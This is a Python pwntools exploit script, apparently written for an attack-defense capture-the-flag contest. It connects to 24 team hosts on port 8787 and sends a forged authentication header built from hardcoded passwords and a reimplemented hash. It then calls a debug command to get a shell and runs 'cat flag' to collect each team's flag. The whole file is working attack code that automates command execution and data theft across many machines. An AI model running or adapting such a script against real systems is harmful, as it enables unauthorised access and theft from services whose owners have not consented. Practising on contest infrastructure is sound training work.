from pwn import * 



cmd_ping = 0  ## leak information 
cmd_register = 1 
cmd_rmusr = 2 
cmd_reset_passwd = 3 
cmd_upload_procedure = 4
cmd_download_procedure = 5 
cmd_list = 6
cmd_rename = 7
cmd_unlink = 8
cmd_debug = 9
cmd_read_cfg = 10 
cmd_save_file = 11
cmd_restore_file = 12 
port = 8787 
payload = ''
flag = ''

passwd = []
for i in range(25):
    passwd.append(b'admin')
passwd[8] = b'5955456059341824784'
passwd[12] = b'pastapastagood'
passwd[16] = b'WOOOOOOheheWADSaaaDA'
passwd[20] = b'admin11111'
passwd[21] = b'not_admin'

count = 0
def pwn1(ip,passwd = b'admin'):
    global flag, count
    r = remote(ip,port)
    r.send(b'NYKD' + p32(decrypt(passwd)) + p32(cmd_debug) + b'admin')
    r.sendafter(b'> ',b'echo && cat flag\n')
    r.recvline(1)
    #r.flushall()
    flag1 = r.recvuntil(b'>', drop = True).decode()
    #payload += flag1.decode() + ','
    flag += flag1 + ','
    count += 1
    print(flag1)
    r.close()

def decrypt(passwd):
    b = b'NYKD54'
    a = passwd
    c = 0x12348765 
    e = 0
    for i in range(len(a)):
        d = b[i%len(b)] ^ a[i]
        e = d ^ e
        e = e * c & 0xffffffff
    return e 

    
for i in range(1,25) : 
    print(i)
    ip = f'10.12.{i}.1'
    try :
        pwn1(ip,passwd=passwd[i])
    except :
        pass

print(flag[:-1])
print(count)